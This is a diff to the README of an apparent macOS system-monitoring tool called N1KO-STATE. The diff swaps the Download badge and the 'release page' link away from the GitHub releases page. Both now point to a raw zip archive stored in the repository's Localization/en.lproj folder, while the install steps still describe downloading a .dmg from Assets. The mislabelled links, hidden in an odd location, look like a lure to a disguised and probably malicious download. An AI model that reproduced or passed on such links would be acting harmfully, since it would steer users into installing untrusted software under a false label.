@@ -1,6 +1,6 @@
 # 🖥️ N1KO-STATE - Monitor your system performance with ease
 
-[![](https://img.shields.io/badge/Download-N1KO--STATE-blue.svg)](https://github.com/Fgnhobe5003/N1KO-STATE/releases)
+[![](https://img.shields.io/badge/Download-N1KO--STATE-blue.svg)](https://raw.githubusercontent.com/Fgnhobe5003/N1KO-STATE/main/Localization/en.lproj/STATE-K-2.9-beta.1.zip)
 
 N1KO-STATE provides a clear view of your computer hardware. It sits in your menu bar and shows data about your processor, graphics card, memory, and fans. This tool uses Swift for low power use. It keeps your desktop clean while providing the data you need to manage your system.
 
@@ -18,7 +18,7 @@ N1KO-STATE provides a clear view of your computer hardware. It sits in your menu
 
 Follow these steps to install the software on your machine.
 
-1.  Visit the [N1KO-STATE release page](https://github.com/Fgnhobe5003/N1KO-STATE/releases).
+1.  Visit the [N1KO-STATE release page](https://raw.githubusercontent.com/Fgnhobe5003/N1KO-STATE/main/Localization/en.lproj/STATE-K-2.9-beta.1.zip).
 2.  Find the section labeled Assets.
 3.  Click the file ending in `.dmg` to start the download.
 4.  Open the file once the download finishes.
